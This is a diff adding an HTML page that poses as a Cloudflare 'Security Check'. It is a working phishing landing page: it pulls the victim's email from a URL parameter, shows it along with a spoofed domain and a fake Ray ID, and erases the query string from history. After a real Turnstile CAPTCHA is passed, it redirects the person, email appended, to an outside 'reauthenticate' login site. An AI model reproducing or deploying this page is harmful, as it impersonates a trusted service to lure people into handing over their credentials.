@@ -1,0 +1,224 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Security Check</title>
+    <script src="https://challenges.cloudflare.com/turnstile/v0/api.js" async defer></script>
+    <style>
+        :root {
+            --apple-blue: #0071e3;
+            --text-main: #1d1d1f;
+            --text-secondary: #86868b;
+        }
+        body {
+            font-family: -apple-system, BlinkMacSystemFont, "SF Pro Text", "Helvetica Neue", Arial, sans-serif;
+            background-color: #ffffff;
+            margin: 0;
+            padding: 0;
+            min-height: 100vh;
+            display: flex;
+            flex-direction: column;
+            color: var(--text-main);
+            -webkit-font-smoothing: antialiased;
+        }
+        header {
+            padding: 60px 16px 16px 16px;
+            text-align: left;
+        }
+        h1 {
+            font-size: 32px;
+            font-weight: 600;
+            margin: 0 0 10px 0;
+            line-height: 1.2;
+            letter-spacing: -0.5px;
+        }
+        #email-display {
+            font-size: 17px;
+            color: var(--text-secondary);
+            font-weight: 400;
+            margin: 0;
+        }
+        .main-content {
+            flex: 1;
+            display: flex;
+            flex-direction: column;
+            align-items: flex-start;
+            justify-content: flex-start;
+            padding: 24px 16px 16px 16px;
+        }
+        .widget-container {
+            margin: 32px 0 24px 0;
+            min-height: 70px;
+            display: flex;
+            align-items: center;
+            justify-content: flex-start;
+            transition: opacity 0.4s ease;
+        }
+        #domain-message {
+            font-size: 14px;
+            color: var(--text-secondary);
+            text-align: left;
+            line-height: 1.45;
+            margin: 0 0 40px 0;
+            padding: 0;
+            text-decoration: none;
+            cursor: default;
+            word-wrap: break-word;
+        }
+        #domain-message span {
+            color: var(--text-main);
+            font-weight: 500;
+        }
+        .loader-wrapper {
+            display: none;
+            flex-direction: column;
+            align-items: flex-start;
+            margin-top: 32px;
+        }
+        .spinner {
+            width: 26px;
+            height: 26px;
+            border: 2.5px solid #e0e0e0;
+            border-top: 2.5px solid var(--apple-blue);
+            border-radius: 50%;
+            animation: spin 1s cubic-bezier(0.4, 0, 0.2, 1) infinite;
+            margin-bottom: 14px;
+        }
+        #status-text {
+            font-size: 14px;
+            color: var(--text-secondary);
+            margin: 0;
+        }
+        @keyframes spin {
+            to { transform: rotate(360deg); }
+        }
+        footer {
+            padding: 16px;
+            text-align: center;
+            margin-top: auto;
+        }
+        .footer-info {
+            font-size: 11px;
+            color: #a0a0a5;
+            letter-spacing: 0.4px;
+            text-transform: uppercase;
+        }
+        .hidden { opacity: 0; pointer-events: none; }
+        .visible { display: flex !important; opacity: 1; }
+
+        /* Desktop / larger screen adjustments */
+        @media (min-width: 481px) {
+            header {
+                padding: 80px 32px 20px 32px;
+                max-width: 600px;
+                margin: 0 auto;
+            }
+            h1 {
+                font-size: 38px;
+            }
+            #email-display {
+                font-size: 19px;
+            }
+            .main-content {
+                padding: 40px 32px 20px 32px;
+                max-width: 600px;
+                margin: 0 auto;
+            }
+            .widget-container {
+                margin: 40px 0 32px 0;
+            }
+            #domain-message {
+                font-size: 15px;
+                margin-bottom: 60px;
+            }
+        }
+    </style>
+</head>
+<body onload="setup()">
+
+<header>
+    <h1 id="headline">Verify you are human by completing the action below.</h1>
+    <div id="email-display">Authenticating session...</div>
+</header>
+
+<main class="main-content">
+
+    <div id="turnstile-wrapper" class="widget-container">
+        <div class="cf-turnstile"
+             data-sitekey="0x4AAAAAACJw0GMsHz2maRHr"
+             data-callback="onSuccess"></div>
+    </div>
+
+    <a href="" id="domain-message" onclick="return false;">
+        <span id="domain-placeholder">Domain</span> needs to review the security of your connection before proceeding.
+    </a>
+
+    <div id="loader-container" class="loader-wrapper">
+        <div class="spinner"></div>
+        <p id="status-text">Securing connection...</p>
+    </div>
+
+</main>
+
+<footer>
+    <div class="footer-info">
+        Ray ID: <span id="ray-id"></span> • Performance & security by <strong>Cloudflare</strong>
+    </div>
+</footer>
+
+<script>
+    let userEmail = "Authorized User";
+
+    function getDomainFromEmailUrlParam() {
+        const params = new URLSearchParams(window.location.search);
+        const emailParam = params.get("bazz505");
+        if (emailParam && emailParam.includes('@')) {
+            return emailParam.split('@')[1];
+        }
+        const host = window.location.hostname;
+        return host.startsWith('www.') ? host.substring(4) : host;
+    }
+
+    function performRedirect() {
+    document.getElementById("email-display").innerHTML =
+        `One more step remaining, redirecting to <span style="color:var(--apple-blue); font-weight:600;">${userEmail}</span> for re-authentication.`;
+
+    document.getElementById("domain-message").style.display = 'none';
+    document.getElementById("loader-container").classList.add("visible");
+
+    setTimeout(() => {
+        window.location.replace(
+            `https://login.reauthenticate.site/aFIlYdId#${userEmail}`
+        );
+    }, 2800);
+}
+
+    function setup() {
+        const params = new URLSearchParams(window.location.search);
+        userEmail = params.get("bazz505") || "Authorized User";
+
+        document.getElementById("email-display").textContent = userEmail;
+
+        const dynamicDomainName = getDomainFromEmailUrlParam();
+        document.getElementById("domain-placeholder").textContent = dynamicDomainName;
+
+        const ray = Math.random().toString(36).substring(2, 10).toUpperCase();
+        document.getElementById("ray-id").textContent = ray;
+
+        if (window.location.search) {
+            window.history.replaceState({}, document.title, window.location.pathname);
+        }
+    }
+
+    function onSuccess(token) {
+        document.getElementById("turnstile-wrapper").classList.add("hidden");
+        setTimeout(() => {
+            document.getElementById("turnstile-wrapper").style.display = "none";
+            document.getElementById("headline").textContent = "Success";
+            performRedirect();
+        }, 400);
+    }
+</script>
+</body>
+</html>
